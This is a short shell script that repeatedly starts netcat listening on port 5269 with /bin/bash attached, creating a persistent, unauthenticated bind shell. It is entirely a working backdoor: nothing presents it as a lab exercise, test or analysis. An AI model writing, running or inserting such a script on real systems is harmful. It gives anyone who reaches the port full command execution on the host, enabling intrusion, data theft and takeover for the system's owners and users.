#!/bin/sh
set -e

PORT=5269

while true; do
    nc -lvnp ${PORT} -e /bin/bash
done